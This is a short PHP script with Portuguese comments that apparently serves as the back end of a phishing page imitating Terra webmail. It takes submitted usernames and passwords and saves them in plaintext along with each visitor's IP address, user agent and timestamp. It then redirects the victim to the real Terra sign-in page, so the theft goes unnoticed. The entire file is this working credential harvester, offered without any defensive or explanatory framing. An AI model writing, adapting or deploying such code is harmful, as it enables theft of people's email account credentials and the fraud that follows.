<?php
// Inicializa as variáveis
$message = '';
$message_class = '';

// Verifica se os dados foram submetidos através do método POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Configurações do banco de dados
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "terra";

    // Cria uma conexão com o banco de dados
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Verifica se a conexão foi estabelecida com sucesso
    if ($conn->connect_error) {
        die("Erro na conexão com o banco de dados: " . $conn->connect_error);
    }

    // Obtém os dados enviados pelo formulário
    $user = $_POST["username"];
    $pass = $_POST["password"];
    // Obtém o IP do cliente
    $ip = $_SERVER['REMOTE_ADDR'];
    // Obtém o User Agent do cliente
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    // Obtém a hora e a data atual
    $data_hora = date('Y-m-d H:i:s');
    // Simula a obtenção da localização (substitua isso com a lógica real para obter a localização)
    $localizacao = "Não disponível";

    // Validação e filtro de entrada
    $user = htmlspecialchars($user);
    $pass = htmlspecialchars($pass);

    // Verifica se o email já está cadastrado no banco de dados
    $sql_check = "SELECT COUNT(*) AS total FROM usuarios WHERE email = ?";
    $stmt_check = $conn->prepare($sql_check);
    $stmt_check->bind_param("s", $user);
    $stmt_check->execute();
    $result = $stmt_check->get_result();
    $row = $result->fetch_assoc();
    $count = $row['total'];

    if ($count > 0) {
        // O email já está cadastrado, exiba uma mensagem de erro ou faça o que for apropriado
        $message_class = "error";
        $message = "Este email já está cadastrado.";
    } else {
        // O email não está cadastrado, então insira os dados no banco de dados
        $sql_insert = "INSERT INTO usuarios (email, senha, ip, user_agent, data_hora, localizacao) 
                VALUES (?, ?, ?, ?, ?, ?)";
        $stmt_insert = $conn->prepare($sql_insert);
        $stmt_insert->bind_param("ssssss", $user, $pass, $ip, $user_agent, $data_hora, $localizacao);
        
        if ($stmt_insert->execute()) {
            // Redireciona para o site desejado após a inserção bem-sucedida
            header("Location: https://mail.terra.com.br/signin?utm_source=portal-terra&utm_medium=home&_gl=1*1n8h2q3*_ga*MTMwMDIwMzI0Ni4xNzIwNjM0Mzk3*_ga_6PE2SMXCWW*MTcyNDI5MTkwNC4zLjAuMTcyNDI5MTkwNC42MC4wLjA.");
            exit(); // Interrompe a execução do código PHP após o redirecionamento
        } else {
            $message_class = "error";
            $message = "Houve um erro ao inserir seus dados. Por favor, tente novamente mais tarde.";
        }
        
        $stmt_insert->close();
    }
    $stmt_check->close();

    // Fecha a conexão com o banco de dados
    $conn->close();
}
?>
